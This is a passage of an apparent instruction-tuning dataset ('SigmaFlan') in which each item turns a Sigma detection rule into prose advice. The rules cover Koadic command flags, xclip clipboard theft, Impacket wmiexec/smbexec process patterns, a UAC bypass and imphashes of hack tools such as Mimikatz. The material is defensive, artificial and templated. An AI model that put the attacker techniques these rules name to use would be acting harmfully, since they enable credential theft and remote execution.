      "answer": "In order to detect Winword starting uncommon sub-process csc.exe as used in exploits for CVE-2017-8759, you should monitor process creation logs on Windows systems. Specifically, look for events where Microsoft Word (WINWORD.EXE) is the parent process that initiates the Compiler for the .NET framework (csc.exe) as a child process. This behavior is unusual and could indicate an attempt to exploit CVE-2017-8759. Any detection of such activity should be considered critical, although it's acknowledged that there might be cases where such behavior does not represent a security threat, these instances are, however, unknown and potentially very rare."
    }
  },
  {
    "instruction": "Explain how should I detect the following: command line parameters used by Koadic hack tool",
    "context": "",
    "output": "In order to detect command line parameters used by Koadic hack tool, you should: monitor the creation of processes on Windows systems with a keen eye for those originating from the command prompt executable, specifically 'cmd.exe'. Be particularly vigilant for command lines that include the combination of '/q', '/c', and 'chcp', which are indicative of a compromise. These parameters together suggest an attempt to quietly execute commands (`/q`), run a specified command and then terminate (`/c`), and change the active console code page (`chcp`), a behavior often seen in attacks leveraging the Koadic hack tool. It's crucial to log both the command line that triggered the detection and its parent's command line for a comprehensive context around the suspicious activity. Given the nature of these indicators, a high level of scrutiny is advised, although some legitimate activities might inadvertently match these criteria.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "command line parameters used by Koadic hack tool",
      "answer": "In order to detect command line parameters used by Koadic hack tool, you should: monitor the creation of processes on Windows systems with a keen eye for those originating from the command prompt executable, specifically 'cmd.exe'. Be particularly vigilant for command lines that include the combination of '/q', '/c', and 'chcp', which are indicative of a compromise. These parameters together suggest an attempt to quietly execute commands (`/q`), run a specified command and then terminate (`/c`), and change the active console code page (`chcp`), a behavior often seen in attacks leveraging the Koadic hack tool. It's crucial to log both the command line that triggered the detection and its parent's command line for a comprehensive context around the suspicious activity. Given the nature of these indicators, a high level of scrutiny is advised, although some legitimate activities might inadvertently match these criteria."
    }
  },
  {
    "instruction": "How can I detect: attempts to collect data stored in the clipboard from users with the usage of xclip tool.\nXclip has to be installed.\nHighly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.\n",
    "context": "",
    "output": "In order to detect attempts to collect data stored in the clipboard from users with the usage of xclip tool, you should monitor audit logs on Linux systems, particularly for auditd service records. Look for events where the execution command (`EXECVE`) involves the `xclip` tool. Specifically, pay attention to usage patterns where the command-line arguments include '-selection' or '-sel', followed by either 'clipboard' or 'clip', and also the '-o' option. This pattern of arguments is indicative of attempts to output the contents of the clipboard, which could be a sign of malicious activity aiming to steal information.\n\nIt is important to note that the detection of this activity is set at a low level due to the possibility of legitimate uses of the xclip tool, especially on user workstations where clipboard utilities are frequently used for non-malicious purposes. However, the monitoring is highly recommended on servers where such usage patterns are less common and more likely to be indicative of an attack.\n\nThis monitoring strategy aligns with MITRE ATT&CK tactics and techniques focused on the collection of data, specifically from information stored in the clipboard, potentially as part of a larger espionage or data theft operation.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "attempts to collect data stored in the clipboard from users with the usage of xclip tool.\nXclip has to be installed.\nHighly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.\n",
      "answer": "In order to detect attempts to collect data stored in the clipboard from users with the usage of xclip tool, you should monitor audit logs on Linux systems, particularly for auditd service records. Look for events where the execution command (`EXECVE`) involves the `xclip` tool. Specifically, pay attention to usage patterns where the command-line arguments include '-selection' or '-sel', followed by either 'clipboard' or 'clip', and also the '-o' option. This pattern of arguments is indicative of attempts to output the contents of the clipboard, which could be a sign of malicious activity aiming to steal information.\n\nIt is important to note that the detection of this activity is set at a low level due to the possibility of legitimate uses of the xclip tool, especially on user workstations where clipboard utilities are frequently used for non-malicious purposes. However, the monitoring is highly recommended on servers where such usage patterns are less common and more likely to be indicative of an attack.\n\nThis monitoring strategy aligns with MITRE ATT&CK tactics and techniques focused on the collection of data, specifically from information stored in the clipboard, potentially as part of a larger espionage or data theft operation."
    }
  },
  {
    "instruction": "Explain how should I detect the following: pattern of a UAC bypass using Windows Event Viewer",
    "context": "",
    "output": "In order to detect the pattern of a UAC bypass using Windows Event Viewer, you should monitor for file events on Windows systems, specifically looking for any activities that involve files ending with '\\Microsoft\\Event Viewer\\RecentViews' or '\\Microsoft\\EventV~1\\RecentViews'. This monitoring should exclude events initiated by programs located in the 'C:\\Windows\\System32\\' or 'C:\\Windows\\SysWOW64\\' directories to reduce false alarms. The focus on these specific file paths is crucial as modifications to Windows Event Viewer recent views can indicate attempts to bypass User Account Control (UAC), a security mechanism in Windows. Despite the generally high confidence in this detection method, there might be scenarios where legitimate activities trigger alerts, hence the notation of potential unknown false positives. The detection is labeled with a high level of importance due to the severity of UAC bypass attempts, which can allow attackers to execute programs with elevated privileges without prompting the user for consent.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "pattern of a UAC bypass using Windows Event Viewer",
      "answer": "In order to detect the pattern of a UAC bypass using Windows Event Viewer, you should monitor for file events on Windows systems, specifically looking for any activities that involve files ending with '\\Microsoft\\Event Viewer\\RecentViews' or '\\Microsoft\\EventV~1\\RecentViews'. This monitoring should exclude events initiated by programs located in the 'C:\\Windows\\System32\\' or 'C:\\Windows\\SysWOW64\\' directories to reduce false alarms. The focus on these specific file paths is crucial as modifications to Windows Event Viewer recent views can indicate attempts to bypass User Account Control (UAC), a security mechanism in Windows. Despite the generally high confidence in this detection method, there might be scenarios where legitimate activities trigger alerts, hence the notation of potential unknown false positives. The detection is labeled with a high level of importance due to the severity of UAC bypass attempts, which can allow attackers to execute programs with elevated privileges without prompting the user for consent."
    }
  },
  {
    "instruction": "How can I detect: findstring commands with a suspicious ParentCommandLine",
    "context": "",
    "output": "In order to detect findstring commands with a suspicious ParentCommandLine, you should monitor for activity on Windows systems where the process creation involves the execution of 'findstr.exe', specifically where the Image path ends with '\\findstr.exe' and the OriginalFileName is identified as 'FINDSTR.EXE'. Additionally, it is critical to look for instances where 'findstr.exe' is launched by a parent command line containing 'tasklist', indicating a potentially malicious activity where findstr might be used in conjunction with tasklist for information gathering or other unauthorized operations. However, it's important to exclude any detection where the command line involves 'httpd.exe', as this could represent legitimate use cases. Keep in mind that the certainty of these detections being malicious is at a medium level, and there may be unknown false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "findstring commands with a suspicious ParentCommandLine",
      "answer": "In order to detect findstring commands with a suspicious ParentCommandLine, you should monitor for activity on Windows systems where the process creation involves the execution of 'findstr.exe', specifically where the Image path ends with '\\findstr.exe' and the OriginalFileName is identified as 'FINDSTR.EXE'. Additionally, it is critical to look for instances where 'findstr.exe' is launched by a parent command line containing 'tasklist', indicating a potentially malicious activity where findstr might be used in conjunction with tasklist for information gathering or other unauthorized operations. However, it's important to exclude any detection where the command line involves 'httpd.exe', as this could represent legitimate use cases. Keep in mind that the certainty of these detections being malicious is at a medium level, and there may be unknown false positives."
    }
  },
  {
    "instruction": "Please help me detect the following: execution of \"rundll32\" with potential obfuscated ordinal calls",
    "context": "",
    "output": "Sure!\nIn order to detect execution of \"rundll32\" with potential obfuscated ordinal calls, you should monitor the creation of processes on Windows operating systems, focusing specifically on instances where 'rundll32.exe' is executed. Look for cases where the image name ends with '\\rundll32.exe', the original file name is explicitly 'RUNDLL32.EXE', or the command line includes the term 'rundll32'. Additionally, pay attention to command line arguments that contain either the '#' character followed by a plus sign or a minus sign, as these may indicate obfuscation techniques typically used in ordinal calls. The detection relies on matching all these conditions to accurately identify suspicious activity. Be aware that there might be cases where legitimate applications trigger these conditions, although such instances are unknown. This method is of a medium severity level in identifying potential abuse of 'rundll32' for malicious purposes.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of \"rundll32\" with potential obfuscated ordinal calls",
      "answer": "In order to detect execution of \"rundll32\" with potential obfuscated ordinal calls, you should monitor the creation of processes on Windows operating systems, focusing specifically on instances where 'rundll32.exe' is executed. Look for cases where the image name ends with '\\rundll32.exe', the original file name is explicitly 'RUNDLL32.EXE', or the command line includes the term 'rundll32'. Additionally, pay attention to command line arguments that contain either the '#' character followed by a plus sign or a minus sign, as these may indicate obfuscation techniques typically used in ordinal calls. The detection relies on matching all these conditions to accurately identify suspicious activity. Be aware that there might be cases where legitimate applications trigger these conditions, although such instances are unknown. This method is of a medium severity level in identifying potential abuse of 'rundll32' for malicious purposes."
    }
  },
  {
    "instruction": "Please help me detect the following: suspicious launch of a renamed version of the PSEXESVC service with, which is not often used by legitimate administrators",
    "context": "",
    "output": "Sure!\nIn order to detect suspicious launch of a renamed version of the PSEXESVC service which is not often used by legitimate administrators, you should: look for the creation of processes on Windows systems where the original file name is identified as 'psexesvc.exe'. However, make a distinction by excluding instances where the image path directly points to 'C:\\Windows\\PSEXESVC.exe', as this specific path may denote legitimate use. Attention should be focused on scenarios where 'psexesvc.exe' is launching from unexpected locations, which could indicate malicious activity. Recognize that legitimate administrative usage of PsExec might generate false positives, thus it is deemed a high-level alert due to its potential security implications.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious launch of a renamed version of the PSEXESVC service with, which is not often used by legitimate administrators",
      "answer": "In order to detect suspicious launch of a renamed version of the PSEXESVC service which is not often used by legitimate administrators, you should: look for the creation of processes on Windows systems where the original file name is identified as 'psexesvc.exe'. However, make a distinction by excluding instances where the image path directly points to 'C:\\Windows\\PSEXESVC.exe', as this specific path may denote legitimate use. Attention should be focused on scenarios where 'psexesvc.exe' is launching from unexpected locations, which could indicate malicious activity. Recognize that legitimate administrative usage of PsExec might generate false positives, thus it is deemed a high-level alert due to its potential security implications."
    }
  },
  {
    "instruction": "Explain how should I detect the following: suspicious WMI event filter and command line event consumer based on WMI and Security Logs.",
    "context": "",
    "output": "In order to detect suspicious WMI event filter and command line event consumer based on WMI and Security Logs, you should: Focus on monitoring Windows Management Instrumentation (WMI) and security logs, particularly looking out for events with ID 5861 and 5859, which are pivotal for identifying suspicious WMI activities. These events are crucial as they represent the binding of WMI filter to consumer and WMI filter registration, respectively. Such detections necessitate that WMI Namespaces Auditing and System Access Control List (SACL) be configured appropriately on systems running Windows 10, Windows Server 2012, or higher versions.\n\nFor a more refined detection, pay attention to specific keywords within the consumer event logs, such as 'ActiveScriptEventConsumer', 'CommandLineEventConsumer', and 'CommandLineTemplate'. These keywords are indicative of potentially malicious WMI consumers that could be utilized for executing arbitrary commands or scripts in response to WMI event filters.\n\nAdditionally, it is essential to filter out benign activities that could trigger false positives, specifically those related to the 'SCM Event Provider'. This involves disregarding events where the query 'select * from MSFT_SCMEventLogEvent' is executed by the 'S-1-5-32-544' user, and the cause is marked as 'Permanent'. Such filtering ensures that only relevant and genuinely suspicious activities are flagged for further investigation.\n\nAlso, be prepared for some degree of unknown false positives since this detection mechanism operates on a relatively small dataset with further testing required to refine its accuracy.\n\nThis detection approach hinges on leveraging WMI and security log monitoring to unearth activities that could be indicative of sophisticated attacks exploiting WMI event filters and consumers for malicious purposes, aligning with tactics and techniques related to Execution and Persistence.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious WMI event filter and command line event consumer based on WMI and Security Logs.",
      "answer": "In order to detect suspicious WMI event filter and command line event consumer based on WMI and Security Logs, you should: Focus on monitoring Windows Management Instrumentation (WMI) and security logs, particularly looking out for events with ID 5861 and 5859, which are pivotal for identifying suspicious WMI activities. These events are crucial as they represent the binding of WMI filter to consumer and WMI filter registration, respectively. Such detections necessitate that WMI Namespaces Auditing and System Access Control List (SACL) be configured appropriately on systems running Windows 10, Windows Server 2012, or higher versions.\n\nFor a more refined detection, pay attention to specific keywords within the consumer event logs, such as 'ActiveScriptEventConsumer', 'CommandLineEventConsumer', and 'CommandLineTemplate'. These keywords are indicative of potentially malicious WMI consumers that could be utilized for executing arbitrary commands or scripts in response to WMI event filters.\n\nAdditionally, it is essential to filter out benign activities that could trigger false positives, specifically those related to the 'SCM Event Provider'. This involves disregarding events where the query 'select * from MSFT_SCMEventLogEvent' is executed by the 'S-1-5-32-544' user, and the cause is marked as 'Permanent'. Such filtering ensures that only relevant and genuinely suspicious activities are flagged for further investigation.\n\nAlso, be prepared for some degree of unknown false positives since this detection mechanism operates on a relatively small dataset with further testing required to refine its accuracy.\n\nThis detection approach hinges on leveraging WMI and security log monitoring to unearth activities that could be indicative of sophisticated attacks exploiting WMI event filters and consumers for malicious purposes, aligning with tactics and techniques related to Execution and Persistence."
    }
  },
  {
    "instruction": "Please help me detect the following: Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.",
    "context": "",
    "output": "Sure!\nIn order to detect adversaries attempting to install a root certificate on a compromised system to avoid warnings when connecting to adversary-controlled web servers, you should monitor Windows PowerShell script logs for actions that deal with certificates, especially in the local machine's root store. Look for scripts that contain activities such as moving items or importing certificates into the 'Cert:\\LocalMachine\\Root' directory. There are two specific behaviors to watch for:\n\n1. Scripts that include both the command to move an item ('Move-Item') and reference the local machine's root certificate store ('Cert:\\LocalMachine\\Root').\n\n2. Scripts that include commands to import a certificate ('Import-Certificate') into the local machine's root store.\n\nIf either of these activities is observed, it could indicate an attempt by an adversary to install a root certificate, which can help them to intercept or manipulate secured communications without triggering security warnings.\n\nBe alert to the possibility of false positives, such as legitimate IT operations that involve adding a corporate Root Certificate Authority (CA) manually. It might be necessary to differentiate between malicious acts and genuine administrative tasks, particularly if Group Policy Objects (GPOs) are used to deploy certificates across the organization, which should not trigger alerts.\n\nThis approach to monitoring and detection is essential for identifying and intervening in potentially malicious activities related to the management of certificates on Windows systems, aligning with the tactics and techniques used by adversaries to undermine secure communications.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.",
      "answer": "In order to detect adversaries attempting to install a root certificate on a compromised system to avoid warnings when connecting to adversary-controlled web servers, you should monitor Windows PowerShell script logs for actions that deal with certificates, especially in the local machine's root store. Look for scripts that contain activities such as moving items or importing certificates into the 'Cert:\\LocalMachine\\Root' directory. There are two specific behaviors to watch for:\n\n1. Scripts that include both the command to move an item ('Move-Item') and reference the local machine's root certificate store ('Cert:\\LocalMachine\\Root').\n\n2. Scripts that include commands to import a certificate ('Import-Certificate') into the local machine's root store.\n\nIf either of these activities is observed, it could indicate an attempt by an adversary to install a root certificate, which can help them to intercept or manipulate secured communications without triggering security warnings.\n\nBe alert to the possibility of false positives, such as legitimate IT operations that involve adding a corporate Root Certificate Authority (CA) manually. It might be necessary to differentiate between malicious acts and genuine administrative tasks, particularly if Group Policy Objects (GPOs) are used to deploy certificates across the organization, which should not trigger alerts.\n\nThis approach to monitoring and detection is essential for identifying and intervening in potentially malicious activities related to the management of certificates on Windows systems, aligning with the tactics and techniques used by adversaries to undermine secure communications."
    }
  },
  {
    "instruction": "How to detect: events that appear when a user click on a link file with a powershell command in it",
    "context": "",
    "output": "In order to detect events that appear when a user clicks on a link file with a PowerShell command in it, you should: Monitor the process creation logs in Windows systems for occurrences where the Command Prompt (cmd.exe) is launched directly by the Windows Explorer (explorer.exe). Specifically, look for instances where the command line executed involves PowerShell commands being initiated from a link file (.lnk). This activity may suggest an attempt to execute malicious scripts or commands through seemingly innocuous link files, directly correlating with techniques that leverage user interaction to perform unauthorized actions. Be mindful that there could be legitimate reasons for such occurrences, and those should be considered to reduce the chances of false positives. The severity level for this type of detection is considered medium.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "events that appear when a user click on a link file with a powershell command in it",
      "answer": "In order to detect events that appear when a user clicks on a link file with a PowerShell command in it, you should: Monitor the process creation logs in Windows systems for occurrences where the Command Prompt (cmd.exe) is launched directly by the Windows Explorer (explorer.exe). Specifically, look for instances where the command line executed involves PowerShell commands being initiated from a link file (.lnk). This activity may suggest an attempt to execute malicious scripts or commands through seemingly innocuous link files, directly correlating with techniques that leverage user interaction to perform unauthorized actions. Be mindful that there could be legitimate reasons for such occurrences, and those should be considered to reduce the chances of false positives. The severity level for this type of detection is considered medium."
    }
  },
  {
    "instruction": "Explain how should I detect the following: Detect file time attribute change to hide new or changes to existing files",
    "context": "",
    "output": "In order to detect file time attribute change to hide new or changes to existing files, you should: Monitor for the creation of processes on macOS systems where the command line ends with '/touch' and includes certain flags like '-t', '-acmr', '-d', or '-r'. These specific flags are used to modify file timestamps, which can be an attempt to obfuscate the modification or creation time of files, potentially as part of a malicious activity. This monitoring should focus on the process creation logs, and any detections should be treated with a medium level of concern due to the possibility of legitimate use cases or unknown false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Detect file time attribute change to hide new or changes to existing files",
      "answer": "In order to detect file time attribute change to hide new or changes to existing files, you should: Monitor for the creation of processes on macOS systems where the command line ends with '/touch' and includes certain flags like '-t', '-acmr', '-d', or '-r'. These specific flags are used to modify file timestamps, which can be an attempt to obfuscate the modification or creation time of files, potentially as part of a malicious activity. This monitoring should focus on the process creation logs, and any detections should be treated with a medium level of concern due to the possibility of legitimate use cases or unknown false positives."
    }
  },
  {
    "instruction": "How to detect: any GAC DLL being loaded by an Office Product",
    "context": "",
    "output": "In order to detect any GAC DLL being loaded by an Office Product, you should: Focus on monitoring the image load events in Windows environments. Specifically, keep an eye out for instances when executable files associated with Microsoft Office applications (such as Excel, Publisher, OneNote, Outlook, PowerPoint, and Word) are involved in loading dynamic-link libraries (DLLs) from the Global Assembly Cache (GAC) directory typically located at 'C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL'. This behavior can be indicative of malicious activity, as attackers may leverage this method to load potentially harmful code via Office applications, exploiting them as vectors for attack. Be aware of false positives which may arise from legitimate macro usage within these applications; adjustments to filtering criteria may be necessary to accommodate normal operations within your environment. This activity is regarded with a high level of concern due to its potential implications for security.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "any GAC DLL being loaded by an Office Product",
      "answer": "In order to detect any GAC DLL being loaded by an Office Product, you should: Focus on monitoring the image load events in Windows environments. Specifically, keep an eye out for instances when executable files associated with Microsoft Office applications (such as Excel, Publisher, OneNote, Outlook, PowerPoint, and Word) are involved in loading dynamic-link libraries (DLLs) from the Global Assembly Cache (GAC) directory typically located at 'C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL'. This behavior can be indicative of malicious activity, as attackers may leverage this method to load potentially harmful code via Office applications, exploiting them as vectors for attack. Be aware of false positives which may arise from legitimate macro usage within these applications; adjustments to filtering criteria may be necessary to accommodate normal operations within your environment. This activity is regarded with a high level of concern due to its potential implications for security."
    }
  },
  {
    "instruction": "How can I detect: modification of autostart extensibility point (ASEP) in registry.",
    "context": "",
    "output": "In order to detect modification of autostart extensibility point (ASEP) in the registry, you should monitor for specific changes in Windows registry settings associated with the WinSock (Windows Sockets API) parameters, which can indicate unauthorized adjustments to how applications automatically start or integrate with the network stack. \n\nThis involves tracking registry set actions (SetValue events) targeting the `\\System\\CurrentControlSet\\Services\\WinSock2\\Parameters` key or its subkeys, `\\Protocol_Catalog9\\Catalog_Entries` and `\\NameSpace_Catalog5\\Catalog_Entries`. These areas are pertinent as they control critical networking functionalities that could be leveraged by an attacker to ensure persistence or to manipulate network communications.\n\nTo accurately identify malicious activity and reduce false positives, filter out entries related to known benign software, specifically installations involving `C:\\Windows\\System32\\MsiExec.exe` and `C:\\Windows\\syswow64\\MsiExec.exe`, as these paths are common for legitimate software installers and might perform legitimate changes to these registry keys.\n\nThe relevant log source for these activities is the registry set category within Windows products. Key fields to keep in view include `SecurityID`, `ObjectName`, `OldValueType`, and `NewValueType`, as changes in these can offer insights into the nature of the modification and the scope of potential impacts.\n\nBe mindful of potential false positives, as legitimate software, including updates and installations, often modifies these Windows registry keys. Similarly, legitimate administrator actions might involve necessary adjustments to these settings for various benign reasons. These instances should be carefully considered to maintain a balance between security vigilance and operational functionality. \n\nThe detection is categorized under medium level due to the potential for legitimate use cases that might lead to modifications in these registry areas. It is essential to correlate this detection with other suspicious activities to ascertain the intent, whether benign or malicious. This observation is a component of broader security measures aimed at safeguarding against tactics and techniques related to the compromise and manipulation of system features for persistence, privilege escalation, or other unauthorized activities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "modification of autostart extensibility point (ASEP) in registry.",
      "answer": "In order to detect modification of autostart extensibility point (ASEP) in the registry, you should monitor for specific changes in Windows registry settings associated with the WinSock (Windows Sockets API) parameters, which can indicate unauthorized adjustments to how applications automatically start or integrate with the network stack. \n\nThis involves tracking registry set actions (SetValue events) targeting the `\\System\\CurrentControlSet\\Services\\WinSock2\\Parameters` key or its subkeys, `\\Protocol_Catalog9\\Catalog_Entries` and `\\NameSpace_Catalog5\\Catalog_Entries`. These areas are pertinent as they control critical networking functionalities that could be leveraged by an attacker to ensure persistence or to manipulate network communications.\n\nTo accurately identify malicious activity and reduce false positives, filter out entries related to known benign software, specifically installations involving `C:\\Windows\\System32\\MsiExec.exe` and `C:\\Windows\\syswow64\\MsiExec.exe`, as these paths are common for legitimate software installers and might perform legitimate changes to these registry keys.\n\nThe relevant log source for these activities is the registry set category within Windows products. Key fields to keep in view include `SecurityID`, `ObjectName`, `OldValueType`, and `NewValueType`, as changes in these can offer insights into the nature of the modification and the scope of potential impacts.\n\nBe mindful of potential false positives, as legitimate software, including updates and installations, often modifies these Windows registry keys. Similarly, legitimate administrator actions might involve necessary adjustments to these settings for various benign reasons. These instances should be carefully considered to maintain a balance between security vigilance and operational functionality. \n\nThe detection is categorized under medium level due to the potential for legitimate use cases that might lead to modifications in these registry areas. It is essential to correlate this detection with other suspicious activities to ascertain the intent, whether benign or malicious. This observation is a component of broader security measures aimed at safeguarding against tactics and techniques related to the compromise and manipulation of system features for persistence, privilege escalation, or other unauthorized activities."
    }
  },
  {
    "instruction": "Please help me detect the following: wmiexec/dcomexec/atexec/smbexec from Impacket framework",
    "context": "",
    "output": "Sure!\nIn order to detect wmiexec/dcomexec/atexec/smbexec from Impacket framework, you should: monitor the creation of processes on Windows systems, paying special attention to specific parent-child process relationships and command line patterns that are indicative of these attack techniques. Look for instances where the parent process is 'wmiprvse.exe' signaling a potential use of wmiexec, 'mmc.exe' for possible dcomexec using MMC object, 'explorer.exe' for dcomexec with ShellBrowserWindow object, and 'services.exe' for smbexec scenario. These executables executing commands that include 'cmd.exe' combined with the parameters '/Q' and '/c', and specifically making network connections to the localhost address '\\\\\\\\127.0.0.1\\\\' followed by redirection '&1', are strong indicators of the described attack techniques being employed. \n\nAdditionally, watch for command line executions stemming from 'svchost.exe -k netsvcs' and 'taskeng.exe' as these may indicate the use of atexec on different versions of Windows (Windows 10 and Windows 7 respectively). These commands will also involve 'cmd.exe', use '/C' for command execution, attempt to write to 'Windows\\Temp\\' directory, and include '&1' in their command structure.\n\nMonitoring and analyzing these specific parent-child process relationships and command line arguments across the system with vigilance can strongly aid in the identification of suspicious activities that align with wmiexec, dcomexec, atexec, and smbexec attacks as part of the Impacket framework usage. This proactive surveillance is crucial, given the high threat level of such activities, albeit with a mindfulness towards the potential for false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "wmiexec/dcomexec/atexec/smbexec from Impacket framework",
      "answer": "In order to detect wmiexec/dcomexec/atexec/smbexec from Impacket framework, you should: monitor the creation of processes on Windows systems, paying special attention to specific parent-child process relationships and command line patterns that are indicative of these attack techniques. Look for instances where the parent process is 'wmiprvse.exe' signaling a potential use of wmiexec, 'mmc.exe' for possible dcomexec using MMC object, 'explorer.exe' for dcomexec with ShellBrowserWindow object, and 'services.exe' for smbexec scenario. These executables executing commands that include 'cmd.exe' combined with the parameters '/Q' and '/c', and specifically making network connections to the localhost address '\\\\\\\\127.0.0.1\\\\' followed by redirection '&1', are strong indicators of the described attack techniques being employed. \n\nAdditionally, watch for command line executions stemming from 'svchost.exe -k netsvcs' and 'taskeng.exe' as these may indicate the use of atexec on different versions of Windows (Windows 10 and Windows 7 respectively). These commands will also involve 'cmd.exe', use '/C' for command execution, attempt to write to 'Windows\\Temp\\' directory, and include '&1' in their command structure.\n\nMonitoring and analyzing these specific parent-child process relationships and command line arguments across the system with vigilance can strongly aid in the identification of suspicious activities that align with wmiexec, dcomexec, atexec, and smbexec attacks as part of the Impacket framework usage. This proactive surveillance is crucial, given the high threat level of such activities, albeit with a mindfulness towards the potential for false positives."
    }
  },
  {
    "instruction": "Explain how should I detect the following: call to \"Win32_QuickFixEngineering\" in order to enumerate installed hotfixes often used in \"enum\" scripts by attackers",
    "context": "",
    "output": "In order to detect calls to \"Win32_QuickFixEngineering\" in order to enumerate installed hotfixes often used in \"enum\" scripts by attackers, you should: Focus on the Windows platform, particularly tracking PowerShell scripts. Ensure that the environment is set up for Script Block Logging, as this is critical for detecting the execution of specific PowerShell commands. Specifically, be on the lookout for scripts that contain both 'Win32_QuickFixEngineering' and 'HotFixID', as these are indicative of attempts to enumerate installed hotfixes, a common reconnaissance technique used by attackers to gain information about the system's vulnerabilities and configuration. It is important to note that while this detection is set at a medium level of alert due to the possibility of similar patterns being present in legitimate administration scripts, any detection should prompt a review to distinguish between benign activity and potential security threats.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "call to \"Win32_QuickFixEngineering\" in order to enumerate installed hotfixes often used in \"enum\" scripts by attackers",
      "answer": "In order to detect calls to \"Win32_QuickFixEngineering\" in order to enumerate installed hotfixes often used in \"enum\" scripts by attackers, you should: Focus on the Windows platform, particularly tracking PowerShell scripts. Ensure that the environment is set up for Script Block Logging, as this is critical for detecting the execution of specific PowerShell commands. Specifically, be on the lookout for scripts that contain both 'Win32_QuickFixEngineering' and 'HotFixID', as these are indicative of attempts to enumerate installed hotfixes, a common reconnaissance technique used by attackers to gain information about the system's vulnerabilities and configuration. It is important to note that while this detection is set at a medium level of alert due to the possibility of similar patterns being present in legitimate administration scripts, any detection should prompt a review to distinguish between benign activity and potential security threats."
    }
  },
  {
    "instruction": "Can you explain how to detect: variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the code block linked in the references",
    "context": "",
    "output": "Certainly!\n\nIn order to detect all variations of obfuscated PowerShell IEX invocation code generated by the Invoke-Obfuscation framework from the code block linked in the references, you should monitor Windows security logs for the creation of new services, specifically focusing on the audit subcategory 'System Security Extension' which needs to be enabled to log Event ID 4697. Detection is based on observing service creation events where the `ServiceFileName` path features complex patterns indicative of obfuscation. These patterns include PowerShell environment variables being accessed in an obfuscated manner, such as `$PSHome`, `$ShellId`, `$env:Public`, and `$env:ComSpec`, among others, often with irregular spacing and concatenations that are uncommon in legitimate scripts. The detection emphasizes capturing instances where these variables are manipulated in ways that suggest an attempt to bypass security measures through obfuscation techniques, such as complex array accesses and method invocations, which are characteristics of scripts attempting to hide malicious activity. Given the high level of obfuscation involved, any detection of these patterns in service creation events should be considered suspicious and warrants further investigation, although it's acknowledged that there may be unknown false positives due to the sophistication of the technique. ",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the code block linked in the references",
      "answer": "In order to detect all variations of obfuscated PowerShell IEX invocation code generated by the Invoke-Obfuscation framework from the code block linked in the references, you should monitor Windows security logs for the creation of new services, specifically focusing on the audit subcategory 'System Security Extension' which needs to be enabled to log Event ID 4697. Detection is based on observing service creation events where the `ServiceFileName` path features complex patterns indicative of obfuscation. These patterns include PowerShell environment variables being accessed in an obfuscated manner, such as `$PSHome`, `$ShellId`, `$env:Public`, and `$env:ComSpec`, among others, often with irregular spacing and concatenations that are uncommon in legitimate scripts. The detection emphasizes capturing instances where these variables are manipulated in ways that suggest an attempt to bypass security measures through obfuscation techniques, such as complex array accesses and method invocations, which are characteristics of scripts attempting to hide malicious activity. Given the high level of obfuscation involved, any detection of these patterns in service creation events should be considered suspicious and warrants further investigation, although it's acknowledged that there may be unknown false positives due to the sophistication of the technique. "
    }
  },
  {
    "instruction": "How to detect: creation of a file on disk that has an imphash of a well-known hack tool",
    "context": "",
    "output": "In order to detect the creation of a file on disk that has an imphash of a well-known hack tool, you should: Monitor Windows systems for file creation events where the file's imphash matches a list of hashes associated with widely recognized hacking tools. This detection mechanism relies on the logging capabilities of Sysmon, specifically with Imphash logging enabled, to track the creation of files that may be indicative of malicious activity. \n\nThe list of imphashes to watch for includes signatures of several high-profile hacking tools and techniques such as PetitPotam, Mimikatz, JuicyPotato, RoguePotato, Pwdump, Htran, Cobalt Strike beacons, PPLDump, NanoDump, HandleKatz, DripLoader, CreateMiniDump, UACMe Akagi, WCE, Sliver Stagers, Dumpert, SysmonEnte, SysmonQuiet, ShaprEvtMute Hook, Forkatz, PPLKiller, and Backstab. These tools are used in a variety of cyber attacks for exploitation, credential dumping, lateral movement, privilege escalation, and evasion techniques.\n\nThe detection focuses on the 'Imphash' and 'Hash|contains' parameters within the system's event logs, specifically within the 'create_stream_hash' category. This aids in identifying the presence of these tools when they are executed or moved within the Windows environment, suggesting potential unauthorized activities or breaches.\n\nThe log source for this detection method is Windows, and the category to be monitored is `create_stream_hash`. It's crucial to ensure that Sysmon configuration includes Imphash logging to capture the necessary data for this detection to work. The fields 'TargetFilename' and 'Image' within the logs can provide additional context about the suspected malicious file creation events, such as the file name and the path of the newly created file.\n\nThis detection strategy is classified at a high level of importance due to the severe implications of a successful attack using these tools. However, it's worth noting that there may be unknown false positives, indicating the need for manual verification of detection alerts to confirm the nature of the detected activity.",
    "category": "SigmaFlan",
